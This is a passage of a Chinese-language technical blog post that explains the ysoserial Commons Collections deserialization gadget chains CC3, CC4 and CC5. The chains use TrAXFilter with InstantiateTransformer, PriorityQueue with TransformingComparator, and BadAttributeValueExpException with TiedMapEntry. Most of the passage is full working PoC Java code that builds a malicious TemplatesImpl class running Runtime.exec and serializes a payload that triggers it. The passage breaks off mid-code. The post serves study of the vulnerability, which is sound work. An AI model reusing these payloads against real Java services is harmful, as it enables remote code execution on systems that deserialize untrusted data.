一个TrAXFilter类的实例</strong>也是可以的啊！ysoserial选择了后者</p><p>怎样可以new一个实例呢？</p><p>ysoserial找到了InstantiateTransformer，看看他的transform方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515104145715.png" alt="image-20210515104145715"></p><p>可以看到，这里面调用了input参数的调用方法，然后借助iParamTypes和iArgs实例化了一个对象出来。</p><p>我们还记得cc1中的Chain可以循环调用transform方法，我们让input是TrAXFilter类对象不就可以了么</p><p>所以这里还是得用到chain</p><p>有了chain，问题来到了哪里会调用chain的入口点呢也就是chain的第一个transform方法？</p><p>记得cc1的LazyMap么？他的get方法会调用transform，如果这里是chain不就美滋滋了么</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515134002101.png" alt="image-20210515134002101"></p><p>哪里可以调用lazyMap的get方法呢？</p><p>或许你还记得cc1的InvocationHandler的invoke会调用get方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515145038750.png" alt="image-20210515145038750"></p><p>稳，现在就是怎么让memberValues参数是LazyMap类型呢？</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515145145356.png" alt="image-20210515145145356"></p><p>降维打击，<strong>动态代理</strong></p><p>我认为这里的思路一定是ysoserial的师傅们看到了AnnotationInvocationHandler既然是InvocationHandler的子类才想到。</p><p>假设现在有一个AnnotationInvocationHandler的类H</p><p>我们都知道，H要是想执行invoke方法，<strong>一定是H作为handler参与了一个动态代理类的实现</strong>。</p><p>我们假设上一句话提到的“一个动态代理类”是p，p调用了任何方法，都会交付给H的invoke去做。</p><p>同时我们还发现AnnotationInvocationHandler的readObject方法</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515151042914.png" alt="image-20210515151042914"></p><p>他可以对Map类型的属性memberValues执行entrySet方法</p><p>这里其实entrySet或者什么别的其实都不重要，重要的是<strong>发生了调用</strong></p><p>所以这里如果this,memberValues是一个LazyMap的代理类，那么这个代理类的handler的invoke方法就必将会执行。</p><p>所以我们上文提到的p，作为代理类，完全可以代理LazyMap类，handler配置为H就可以了</p><p>那么现在就是确定了我们的payload最外面是AnnotationInvocationHandler类，起名h2，我们要把h2.memberValues配置为一个动态代理，这里可以起名为mapProxy。</p><p>mapProxy目标是为了存放在h2.memberValues里，为了invoke。</p><p>mapProxy的handler位置需要设置为h1，这个h1也是AnnotationInvocationHandler类，h1.memberValues需要设置为LazyMap，为了LazyMap.get。</p><p>所以正常走下来就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h2.readObject() -&gt; h2.memberValues.xxx() -&gt; mapproxy.xxx() -&gt; h1.invoke() -&gt; h1.memberValues.get() -&gt; LazyMap.get()</span><br></pre></td></tr></table></figure><p>成功续命。</p><h3 id="调用链流程梳理"><a href="#调用链流程梳理" class="headerlink" title="调用链流程梳理"></a>调用链流程梳理</h3><p>正常进入AnnotationInvocationHandler的readObject方法，h2的memberValues属性就是mapProxy</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515133241920.png" alt="image-20210515133241920"></p><p>这里由于mapProxy是动态代理，所以只要调用就会调用handler的invoke方法，mapProxy的handler就是h1</p><p>h1也是AnnotationInvocationHandler类，所以会进入本类AnnotationInvocationHandler的invoke方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515133608739.png" alt="image-20210515133608739"></p><p>由于h1的memberValues属性是传进去的lazymap，所以会调用LazyMap的get方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515134002101.png" alt="image-20210515134002101"></p><p>factory是chain，会进入chain的transform，接下里就很熟悉了：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515134046605.png" alt="image-20210515134046605"></p><p>成环调用，chain中第一个是元素是<code>new ConstantTransformer(TrAXFilter.class),</code>所以看上面，第一个循环的object返回的就是TrAXFilter的类对象（get(key)参数被无情抛弃），重点是第二次，会进入InstantiateTransformer的transform方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515140301462.png" alt="image-20210515140301462"></p><p>这里面细说，input参数是第一次object对象也就是TrAXFilter.class类对象，iParamTypes属性就是外面构造好的Templates.class类对象，iArgs属性就是提前传进来的tmpl对象。</p><p>con方法是TrAXFilter类中，满足只有一个Templates接口参数的构造函数。</p><p>tmpl是TemplatesImpl类，会调用Templates接口的newInstance方法，参数是iArgs也就是tmpl。</p><p>所以这里会走到TrAXFilter类的构造函数：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515140852568.png" alt="image-20210515140852568"></p><p>导致触发！</p><h3 id="最终版本PoC-4"><a href="#最终版本PoC-4" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><p>PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrAXFilter_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.构造chain，封装进LazyMap</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                <span class="title">new</span> <span class="title">InstantiateTransformer</span>(</span></span><br><span class="line">                        new Class[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;tmpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap lazymap = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4. 拿到cons,先做一个h1，h1.memberValues = lazymap</span></span><br><span class="line">        <span class="keyword">final</span> Constructor cons = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler h1 = (InvocationHandler) cons.newInstance(Target<span class="class">.<span class="keyword">class</span>,<span class="title">lazymap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建LazyMap的动态代理类实例</span></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(),<span class="title">LazyMap</span>.<span class="title">class</span>.<span class="title">getInterfaces</span>(),<span class="title">h1</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个AnnotationInvocationHandler实例h2，并且把刚刚创建的代理赋值给h2.memberValues</span></span><br><span class="line">        InvocationHandler h2 = (InvocationHandler)cons.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">mapProxy</span>)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc3_TrAXFilter.ser"</span>)));</span><br><span class="line">        fout.writeObject(h2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc3_TrAXFilter.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="cc4"><a href="#cc4" class="headerlink" title="cc4"></a>cc4</h2><p>环境：</p><ul><li><strong>commons-collections4: 4.0</strong></li><li><strong>jdk7u21</strong>之前</li></ul><p>cc4是cc2和cc3的杂交体</p><p>前半段用了cc2的PriorityQueue以及TransformingComparator，TransformingComparator本来应该调用InvokeTransformer的transform方法的，但是因为InvokeTransformer被ban掉了，所以这里ysoserial用了cc3的chain，里面用的是InstantiateTransformer，用了InstantiateTransformer就必须要进行类实例的构造，也就和cc3后面一样了，也用了TrAXFilter来包装TemplatesImpl。</p><h3 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h3><p>cc2里面的前半部分可以一直走到TransformingComparator的transform方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516161059025.png" alt="image-20210516161059025"></p><p>在cc2里面，这里面的<code>this.transformer</code>是InvokerTransformer，但是在cc4里，我们需要换成chain来包装InstantiateTransformer，也就离不开后续TrAXFilter的newInstance了。</p><h3 id="最终版本PoC-5"><a href="#最终版本PoC-5" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.构造chain,包装成TransformingComparator里，构造成</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                <span class="title">new</span> <span class="title">InstantiateTransformer</span>(</span></span><br><span class="line">                        new Class[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;tmpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        TransformingComparator iTransComparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.开始new一个 PriorityQueue，因为他的readObject方法是一切的开始</span></span><br><span class="line">        PriorityQueue pq = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queueArray = <span class="keyword">new</span> Object[]&#123;tmpl, <span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//解封属性comparator, iTransformingComparator =&gt; _comparator</span></span><br><span class="line">        Field _comparator = PriorityQueue.class.getDeclaredField("comparator");</span><br><span class="line">        _comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _comparator.set(pq, iTransComparator);</span><br><span class="line">        <span class="comment">//解封属性queue，queueArray =&gt; _queue</span></span><br><span class="line">        Field _queue = PriorityQueue.class.getDeclaredField("queue");</span><br><span class="line">        _queue.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _queue.set(pq, queueArray);</span><br><span class="line">        <span class="comment">//size修改为2</span></span><br><span class="line">        Field _size = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"size"</span>);</span><br><span class="line">        _size.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _size.set(pq, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/src/main/resources/Payload_cc4_PriorityQueue.ser"</span>)));</span><br><span class="line">            outputStream.writeObject(pq);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/src/main/resources/Payload_cc4_PriorityQueue.ser"</span>)));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里面在PriorityQueue处还可以有第二种写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4.开始new一个 PriorityQueue，因为他的readObject方法是一切的开始</span></span><br><span class="line">PriorityQueue pq = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line">pq.add(<span class="number">1</span>);</span><br><span class="line">pq.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//解封属性comparator, iTransformingComparator =&gt; _comparator</span></span><br><span class="line">Field _comparator = PriorityQueue.class.getDeclaredField("comparator");</span><br><span class="line">_comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">_comparator.set(pq, iTransComparator);</span><br></pre></td></tr></table></figure><p>第二种为什么只提前add了两下就可以了呢？</p><p>debug一下，看第一次add：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171058621.png" alt="image-20210516171058621"></p><p>size默认是0，所以这里属性queue[]已经赋值了第一个元素Integer(1)，size也被复制为1</p><p>第二次add：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171416672.png" alt="image-20210516171416672"></p><p>进到siftUp看一下，我们没有给comparator赋值，所以会进入else分支：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171513699.png" alt="image-20210516171513699"></p><p>siftUpComparator会将元素重新排序：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171612711.png" alt="image-20210516171612711"></p><p>两次add结束之后的状态：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171655090.png" alt="image-20210516171655090"></p><p>接下来解封comparator属性，包我们构造好的TransformingComparator借助反射赋值给它:</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171754309.png" alt="image-20210516171754309"></p><p>最终属性：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171933102.png" alt="image-20210516171933102"></p><p>话说回来，要是第一种，没有提前add两次赋值呢？</p><p>简短来说，那就是size和parator都没有赋值，只能再麻烦用反射去给size和queue赋值。</p><h2 id="cc5"><a href="#cc5" class="headerlink" title="cc5"></a>cc5</h2><p>条件：</p><ul><li><p><strong>commons-collections:3.1-3.2.1</strong></p></li><li><p><strong>jdk1.8</strong></p></li></ul><h3 id="利用链寻找-4"><a href="#利用链寻找-4" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>因为jdk在1.8之后对AnnotationInvocationHandler类做了限制，所以在jdk1.8版本就必须找出能替代AnnotationInvocationHandler的新的可以利用的类，所以TiedMapEntry和BadAttributeValueExpException就被挖掘了出来。</p><p>先看cc中的TiedMapEntry的源码：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516200356238.png" alt="image-20210516200356238"></p><p>这里的map属性显然是可控的。</p><p>如果是我们熟悉的LazyMap就好了，这样就可以调用LazyMap.get方法进而触发Transformer的transform函数，执行调用链。</p><p>哪里可以调用TiedMapEntry的getValue呢？</p><p>TiedMapEntry的toString方法就可以</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516200813987.png" alt="image-20210516200813987"></p><p>那么有没有一个类可以在反序列化时触发 TiedMapEntry.toString() 呢？ BadAttributeValueExpException</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516201549257.png" alt="image-20210516201549257"></p><p>这里可以看到valObj也是从val属性拿到的，我们只要构造的时候把val属性设置为TiedMapEntry即可。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516202426352.png" alt="image-20210516202426352"></p><p>val是private，所以这里还是得用反射去构造。</p><h3 id="最终版本PoC-6"><a href="#最终版本PoC-6" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><p><strong>ver1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BadAttributeValueExpException_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>,<span class="string">"abcd"</span>);</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="number">123</span>);</span><br><span class="line">        BadAttributeValueExpException payload = <span class="keyword">new</span> BadAttributeValueExpException(<span class="number">1</span>);</span><br><span class="line">        Field val = BadAttributeValueExpException.class.getDeclaredField("val");</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(payload,tmap);</span><br><span class="line"></span><br><span class="line">        <span 